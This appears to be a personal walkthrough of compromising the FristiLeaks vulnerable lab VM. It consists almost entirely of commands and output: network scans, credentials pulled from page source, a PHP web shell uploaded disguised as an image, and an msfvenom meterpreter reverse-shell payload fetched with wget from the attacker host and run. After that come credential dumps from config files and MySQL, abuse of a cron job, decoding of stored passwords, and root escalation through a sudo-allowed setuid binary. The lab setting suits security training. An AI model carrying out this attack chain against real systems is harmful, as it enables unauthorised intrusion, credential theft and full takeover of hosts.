# fristileaks

| Proto | port    | Service/URL                         | Info                                     | Potential Vulns | Verified Vulns |
|-------|---------|-------------------------------------|------------------------------------------|-----------------|----------------|


## where you at
```
nmap -sn -PR 192.168.88.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 23:39 CET
Nmap scan report for 192.168.88.2
Host is up (0.00052s latency).
MAC Address: 00:50:56:FE:4E:C1 (VMware)
Nmap scan report for 192.168.88.133
Host is up (0.00067s latency).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.88.254
Host is up (0.00060s latency).
MAC Address: 00:50:56:F7:8F:D0 (VMware)
Nmap scan report for 192.168.88.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds
```

## what you got

### tcp

```
map -p- -A 192.168.88.133 -oA tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 23:41 CET
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 11.73% done; ETC: 23:44 (0:02:53 remaining)
Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 81.78% done; ETC: 23:43 (0:00:28 remaining)
Nmap scan report for 192.168.88.133
Host is up (0.00061s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32, Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.88.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.46 seconds
```

### nikto

```
nikto -h 192.168.88.133
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.88.133
+ Target Hostname:    192.168.88.133
+ Target Port:        80
+ Start Time:         2020-01-05 12:51:52 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 19:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8727 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-01-05 12:52:13 (GMT1) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### gobuster

```
~/go/bin/gobuster dir -u http://192.168.88.133 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt  -t 40 -e 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.88.133
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,sql,html,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/04 23:45:08 Starting gobuster
===============================================================
http://192.168.88.133/index.html (Status: 200)
http://192.168.88.133/images (Status: 301)
http://192.168.88.133/robots.txt (Status: 200)
http://192.168.88.133/beer (Status: 301)
http://192.168.88.133/cola (Status: 301)
===============================================================
2020/01/04 23:49:44 Finished
===============================================================
```



### FRISTI MAN

http://192.168.88.133/fristi/

username in code

eezeepz


base64 image in code

keKkeKKeKKeKkEkkEk

login  
eezeepz:keKkeKKeKKeKkEkkEk

## Exploit

Upload `shell.php.jpg` (`https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php`)

```
Uploading, please wait
The file has been uploaded to /uploads
```

http://192.168.88.133/fristi/uploads/shell.php.jpg

```
p0wny@shell:…/fristi/uploads# whoami
apache

p0wny@shell:…/fristi/uploads# uname -na
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
```

```
p0wny@shell:…/fristi/uploads# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
vboxadd:x:498:1::/var/run/vboxadd:/bin/false
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
```
```
p0wny@shell:/home/admin# cat /etc/group
root:x:0:
bin:x:1:bin,daemon
daemon:x:2:bin,daemon
sys:x:3:bin,adm
adm:x:4:adm,daemon
tty:x:5:
disk:x:6:
lp:x:7:daemon
mem:x:8:
kmem:x:9:
wheel:x:10:
mail:x:12:mail,postfix
uucp:x:14:
man:x:15:
games:x:20:
gopher:x:30:
video:x:39:
dip:x:40:
ftp:x:50:
lock:x:54:
audio:x:63:
nobody:x:99:
users:x:100:
floppy:x:19:
vcsa:x:69:
utmp:x:22:
utempter:x:35:
cdrom:x:11:
tape:x:33:
dialout:x:18:
saslauth:x:76:
postdrop:x:90:
postfix:x:89:
fuse:x:499:
sshd:x:74:
apache:x:48:
mysql:x:27:
vboxsf:x:498:
eezeepz:x:500:
admin:x:501:
fristigod:x:502:fristi
```

```
p0wny@shell:…/fristi/uploads# netstat -tulnp
(No info could be read for "-p": geteuid()=48 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name
tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      -
tcp        0      0 :::80                       :::*                        LISTEN      -
udp        0      0 0.0.0.0:68                  0.0.0.0:*                               -
```

```
p0wny@shell:…/fristi/uploads# ps aux | grep root
root         1  0.0  0.1  19232  1492 ?        Ss   18:38   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    18:38   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    18:38   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S    18:38   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S    18:38   0:00 [stopper/0]
root         6  0.0  0.0      0     0 ?        S    18:38   0:00 [watchdog/0]
root         7  0.0  0.0      0     0 ?        S    18:38   0:00 [migration/1]
root         8  0.0  0.0      0     0 ?        S    18:38   0:00 [stopper/1]
root         9  0.0  0.0      0     0 ?        S    18:38   0:00 [ksoftirqd/1]
root        10  0.0  0.0      0     0 ?        S    18:38   0:00 [watchdog/1]
root        11  0.0  0.0      0     0 ?        S    18:38   0:00 [events/0]
root        12  0.1  0.0      0     0 ?        S    18:38   0:04 [events/1]
root        13  0.0  0.0      0     0 ?        S    18:38   0:00 [events/0]
root        14  0.0  0.0      0     0 ?        S    18:38   0:00 [events/1]
root        15  0.0  0.0      0     0 ?        S    18:38   0:00 [events_long/0]
root        16  0.0  0.0      0     0 ?        S    18:38   0:00 [events_long/1]
root        17  0.0  0.0      0     0 ?        S    18:38   0:00 [events_power_ef]
root        18  0.0  0.0      0     0 ?        S    18:38   0:00 [events_power_ef]
root        19  0.0  0.0      0     0 ?        S    18:38   0:00 [cgroup]
root        20  0.0  0.0      0     0 ?        S    18:38   0:00 [khelper]
root        21  0.0  0.0      0     0 ?        S    18:38   0:00 [netns]
root        22  0.0  0.0      0     0 ?        S    18:38   0:00 [async/mgr]
root        23  0.0  0.0      0     0 ?        S    18:38   0:00 [pm]
root        24  0.0  0.0      0     0 ?        S    18:38   0:00 [sync_supers]
root        25  0.0  0.0      0     0 ?        S    18:38   0:00 [bdi-default]
root        26  0.0  0.0      0     0 ?        S    18:38   0:00 [kintegrityd/0]
root        27  0.0  0.0      0     0 ?        S    18:38   0:00 [kintegrityd/1]
root        28  0.0  0.0      0     0 ?        S    18:38   0:00 [kblockd/0]
root        29  0.0  0.0      0     0 ?        S    18:38   0:00 [kblockd/1]
root        30  0.0  0.0      0     0 ?        S    18:38   0:00 [kacpid]
root        31  0.0  0.0      0     0 ?        S    18:38   0:00 [kacpi_notify]
root        32  0.0  0.0      0     0 ?        S    18:38   0:00 [kacpi_hotplug]
root        33  0.0  0.0      0     0 ?        S    18:38   0:00 [ata_aux]
root        34  0.0  0.0      0     0 ?        S    18:38   0:00 [ata_sff/0]
root        35  0.0  0.0      0     0 ?        S    18:38   0:00 [ata_sff/1]
root        36  0.0  0.0      0     0 ?        S    18:38   0:00 [ksuspend_usbd]
root        37  0.0  0.0      0     0 ?        S    18:38   0:00 [khubd]
root        38  0.0  0.0      0     0 ?        S    18:38   0:00 [kseriod]
root        39  0.0  0.0      0     0 ?        S    18:38   0:00 [md/0]
root        40  0.0  0.0      0     0 ?        S    18:38   0:00 [md/1]
root        41  0.0  0.0      0     0 ?        S    18:38   0:00 [md_misc/0]
root        42  0.0  0.0      0     0 ?        S    18:38   0:00 [md_misc/1]
root        43  0.0  0.0      0     0 ?        S    18:38   0:00 [linkwatch]
root        45  0.0  0.0      0     0 ?        S    18:38   0:00 [khungtaskd]
root        46  0.0  0.0      0     0 ?        S    18:38   0:00 [kswapd0]
root        47  0.0  0.0      0     0 ?        SN   18:38   0:00 [ksmd]
root        48  0.0  0.0      0     0 ?        SN   18:38   0:00 [khugepaged]
root        49  0.0  0.0      0     0 ?        S    18:38   0:00 [aio/0]
root        50  0.0  0.0      0     0 ?        S    18:38   0:00 [aio/1]
root        51  0.0  0.0      0     0 ?        S    18:38   0:00 [crypto/0]
root        52  0.0  0.0      0     0 ?        S    18:38   0:00 [crypto/1]
root        59  0.0  0.0      0     0 ?        S    18:38   0:00 [kthrotld/0]
root        60  0.0  0.0      0     0 ?        S    18:38   0:00 [kthrotld/1]
root        61  0.0  0.0      0     0 ?        S    18:38   0:00 [pciehpd]
root        63  0.0  0.0      0     0 ?        S    18:38   0:00 [kpsmoused]
root        64  0.0  0.0      0     0 ?        S    18:38   0:00 [usbhid_resumer]
root        65  0.0  0.0      0     0 ?        S    18:38   0:00 [deferwq]
root        98  0.0  0.0      0     0 ?        S    18:38   0:00 [kdmremove]
root        99  0.0  0.0      0     0 ?        S    18:38   0:00 [kstriped]
root       228  0.0  0.0      0     0 ?        S    18:38   0:00 [scsi_eh_0]
root       236  0.0  0.0      0     0 ?        S    18:38   0:00 [scsi_eh_1]
root       438  0.0  0.0      0     0 ?        S    18:38   0:00 [kdmflush]
root       440  0.0  0.0      0     0 ?        S    18:38   0:00 [kdmflush]
root       458  0.0  0.0      0     0 ?        S    18:38   0:00 [jbd2/dm-0-8]
root       459  0.0  0.0      0     0 ?        S    18:38   0:00 [ext4-dio-unwrit]
root       540  0.0  0.1  11072  1272 ?        S<s  18:38   0:00 /sbin/udevd -d
root       822  0.0  0.0      0     0 ?        S    18:38   0:00 [vmmemctl]
root       991  0.0  0.0      0     0 ?        S    18:38   0:00 [jbd2/sda1-8]
root       992  0.0  0.0      0     0 ?        S    18:38   0:00 [ext4-dio-unwrit]
root      1024  0.0  0.0      0     0 ?        S    18:38   0:00 [kauditd]
root      1220  0.0  0.0      0     0 ?        S    18:38   0:01 [flush-253:0]
root      1282  0.0  0.0   9120   972 ?        Ss   18:38   0:00 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient-eth0.leases -pf /var/run/dhclient-eth0.pid eth0
root      1350  0.0  0.0  27596   796 ?        S<sl 18:38   0:00 auditd
root      1372  0.0  0.1 249084  1604 ?        Sl   18:38   0:00 /sbin/rsyslogd -i /var/run/syslogd.pid -c 5
root      1444  0.0  0.1  11068  1180 ?        S<   18:38   0:00 /sbin/udevd -d
root      1516  0.0  0.1 108168  1568 ?        S    18:38   0:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --pid-file=/var/run/mysqld/mysqld.pid --basedir=/usr --user=mysql
root      1645  0.0  1.0 251996 11020 ?        Ss   18:38   0:00 /usr/sbin/httpd
root      1665  0.0  0.1 116864  1224 ?        Ss   18:38   0:00 crond
root      1678  0.0  0.0   4064   600 tty1     Ss+  18:38   0:00 /sbin/mingetty /dev/tty1
root      1680  0.0  0.0   4064   600 tty2     Ss+  18:38   0:00 /sbin/mingetty /dev/tty2
root      1682  0.0  0.1  11068  1176 ?        S<   18:38   0:00 /sbin/udevd -d
root      1683  0.0  0.0   4064   600 tty3     Ss+  18:38   0:00 /sbin/mingetty /dev/tty3
root      1685  0.0  0.0   4064   596 tty4     Ss+  18:38   0:00 /sbin/mingetty /dev/tty4
root      1687  0.0  0.0   4064   596 tty5     Ss+  18:38   0:00 /sbin/mingetty /dev/tty5
root      1689  0.0  0.0   4064   596 tty6     Ss+  18:38   0:00 /sbin/mingetty /dev/tty6
root      2450  0.0  0.0  19052   964 ?        Ss   19:01   0:00 /usr/sbin/anacron -s
```

```
p0wny@shell:…/fristi/uploads# python --version
```

```
msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.88.128 lport=4444 -f raw -o r_s.py
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 454 bytes
Saved as: r_s.py

python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.88.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

```
p0wny@shell:…/fristi/uploads# wget http://192.168.88.128:8000/r_s.py
--2020-01-04 19:23:00--  http://192.168.88.128:8000/r_s.py
Connecting to 192.168.88.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 454 [text/plain]
Saving to: `r_s.py'

     0K                                                       100% 73.4M=0s

2020-01-04 19:23:00 (73.4 MB/s) - `r_s.py' saved [454/454]
p0wny@shell:…/fristi/uploads# python r_s.py
```

```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.88.128:4444 
[*] Sending stage (53755 bytes) to 192.168.88.133
[*] Meterpreter session 1 opened (192.168.88.128:4444 -> 192.168.88.133:45693) at 2020-01-05 13:15:34 +0100
[*] Sending stage (53755 bytes) to 192.168.88.133
[*] Meterpreter session 2 opened (192.168.88.128:4444 -> 192.168.88.133:45694) at 2020-01-05 13:15:35 +0100

meterpreter > ls
Listing: /var/www/html/fristi
=============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100644/rw-r--r--  1310    fil   2015-11-25 10:11:03 +0100  checklogin.php
100644/rw-r--r--  1216    fil   2015-11-25 10:11:03 +0100  do_upload.php
100644/rw-r--r--  1396    fil   2015-11-25 10:11:03 +0100  index.php
100644/rw-r--r--  191     fil   2015-11-25 10:11:03 +0100  login_success.php
100644/rw-r--r--  45      fil   2015-11-25 10:11:03 +0100  logout.php
100644/rw-r--r--  1396    fil   2015-11-25 10:11:03 +0100  main_login.php
100644/rw-r--r--  131736  fil   2015-11-25 10:11:03 +0100  pic.b64
100644/rw-r--r--  1642    fil   2015-11-25 10:11:03 +0100  pic2.b64
100644/rw-r--r--  372     fil   2015-11-25 10:11:03 +0100  upload.php
40777/rwxrwxrwx   4096    dir   2020-01-05 01:23:00 +0100  uploads

meterpreter > cat checklogin.php
<?php

ob_start();
$host="localhost"; // Host name
$username="eezeepz"; // Mysql username
$password="4ll3maal12#"; // Mysql password
$db_name="hackmenow"; // Database name
$tbl_name="members"; // Table name
```


`eezeepz:4ll3maal12#`

```
meterpreter > shell

Process 2952 created.
Channel 50 created.
sh: no job control in this shell
sh-4.1$ mysql -u eezeepz -p
Enter password: 4ll3maal12#

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 5.1.73 Source distribution

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use hackmenow;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+---------------------+
| Tables_in_hackmenow |
+---------------------+
| members             |
+---------------------+
1 row in set (0.00 sec)


mysql> select * from members;
+----+----------+--------------------+
| id | username | password           |
+----+----------+--------------------+
|  1 | eezeepz  | keKkeKKeKKeKkEkkEk |
+----+----------+--------------------+
1 row in set (0.00 sec)
```

```
sh-4.1$ pwd
/home/eezeepz
sh-4.1$ ls
MAKEDEV    chown        hostname  netreport       taskset     weak-modules
cbq        clock        hwclock   netstat         tc          wipefs
cciss_id   consoletype  kbd_mode  new-kernel-pkg  telinit     xfs_repair
cfdisk     cpio         kill      nice            touch       ypdomainname
chcpu      cryptsetup   killall5  nisdomainname   tracepath   zcat
chgrp      ctrlaltdel   kpartx    nologin         tracepath6  zic
chkconfig  cut          nameif    notes.txt       true
chmod      halt         nano      tar             tune2fs
sh-4.1$ cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```

```
p0wny@shell:…/fristi/uploads# cd /home/


p0wny@shell:/home# ls
admin
eezeepz
fristigod

p0wny@shell:/home# cd eezeepz
p0wny@shell:/home/eezeepz# ls
MAKEDEV
cbq
cciss_id
cfdisk
chcpu
chgrp
chkconfig
chmod
chown
clock
consoletype
cpio
cryptsetup
ctrlaltdel
cut
halt
hostname
hwclock
kbd_mode
kill
killall5
kpartx
nameif
nano
netreport
netstat
new-kernel-pkg
nice
nisdomainname
nologin
notes.txt
tar
taskset
tc
telinit
touch
tracepath
tracepath6
true
tune2fs
weak-modules
wipefs
xfs_repair
ypdomainname
zcat
zic

p0wny@shell:/home/eezeepz# cat notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry


p0wny@shell:/tmp# echo '/home/admin/chmod 777 /home/ -R' > runthis

p0wny@shell:/tmp# cat cronresult
executing: /home/admin/chmod 777 /home/ -R

p0wny@shell:/home# ls -la
total 28
drwxr-xr-x.  5 root      root       4096 Nov 19  2015 .
dr-xr-xr-x. 22 root      root       4096 Jan  4 18:38 ..
drwxrwxrwx.  2 admin     admin      4096 Nov 19  2015 admin
drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18  2015 eezeepz
drwx------   2 fristigod fristigod  4096 Nov 19  2015 fristigod

p0wny@shell:/home# cd admin


p0wny@shell:/home/admin# ls
cat
chmod
cronjob.py
cryptedpass.txt
cryptpass.py
df
echo
egrep
grep
ps
whoisyourgodnow.txt


p0wny@shell:/home/admin# cat cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq

p0wny@shell:/home/admin# cat whoisyourgodnow.txt
=RFn0AKnlMHMPIzpyuTI0ITG


p0wny@shell:/home/admin# cat cryptpass.py
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)
    return codecs.encode(base64string[::-1], 'rot13')

cryptoResult=encodeString(sys.argv[1])
print cryptoResult


rot13, reverse, base64 decode
codecs.encode(base64string[::-1], 'rot13')

mVGZ3O3omkJLmy2pcuTq = thisisalsopw123

=RFn0AKnlMHMPIzpyuTI0ITG = LetThereBeFristi!

p0wny@shell:/home/admin# su fristigod
standard in must be a tty
```

```
meterpreter > shell
Process 3464 created.
Channel 1 created.
sh: no job control in this shell
sh-4.1$ su fristigod
Password: LetThereBeFristi!

bash: no job control in this shell
bash-4.1$ find / -user fristigod >> fristi_files.txt
bash-4.1$ cat fristi_files.txt  
...

/proc/3576/coredump_filter
/proc/3576/io
/home/admin/fristi_files.txt
/home/admin/whoisyourgodnow.txt
/home/fristigod
/home/fristigod/.bash_logout
/home/fristigod/.bashrc
/home/fristigod/.bash_profile
/var/spool/mail/fristigod
/var/fristigod
/var/fristigod/.bash_history
/var/fristigod/.secret_admin_stuff
ash-4.1$ cd /var/fristigod
bash-4.1$ ls -la
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
-bash-4.1$ cat .bash_history
    cat .bash_history
    ls
    pwd
    ls -lah
    cd .secret_admin_stuff/
    ls
    ./doCom 
    ./doCom test
    sudo ls
    exit
    cd .secret_admin_stuff/
    ls
    ./doCom 
    sudo -u fristi ./doCom ls /
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
    exit
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    exit
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    exit
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    sudo /var/fristigod/.secret_admin_stuff/doCom
    exit
    sudo /var/fristigod/.secret_admin_stuff/doCom
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    exit
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    exit
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    groups
    ls -lah
    usermod -G fristigod fristi
    exit
    sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
    less /var/log/secure e
    Fexit
    exit
    exit
bash-4.1$ cd ./.secret_admin_stuff
bash-4.1$ ls -lA
total 8
-rwsr-sr-x 1 root root 7529 Nov 25  2015 doCom
bash-4.1$ sudo -u fristi ./doCom ls /
sudo: sorry, you must have a tty to run sudo
bash-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ sudo -u fristi ./doCom ls /
[sudo] password for fristigod: LetThereBeFristi!

bin   dev  home  lib64       media  opt   root  selinux  sys  usr
boot  etc  lib   lost+found  mnt    proc  sbin  srv      tmp  var
bash-4.1$  sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom usermod -aG root fristigod
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom usermod -aG root fristigod
ot fristigodti /var/fristigod/.secret_admin_stuff/doCom usermod -aG ro 
bash-4.1$ cat /etc/group
cat /etc/group
root:x:0:fristigod
bash-4.1$ sudo bash
sudo bash
Sorry, user fristigod is not allowed to execute '/bin/bash' as root on localhost.localdomain.
bash-4.1$ sudo  python -c 'import pty;pty.spawn("/bin/bash")'
sudo  python -c 'import pty;pty.spawn("/bin/bash")'
Sorry, user fristigod is not allowed to execute '/usr/bin/python -c import pty;pty.spawn("/bin/bash")' as root on localhost.localdomain.
bash-4.1$ sudo -l
[sudo] password for fristigod: LetThereBeFristi!Matching Defaults entries for fristigod on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/binUser fristigod may run the following commands on this host:
    (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
bash-4.1# id
id
uid=0(root) gid=100(users) groups=100(users),502(fristigod)
```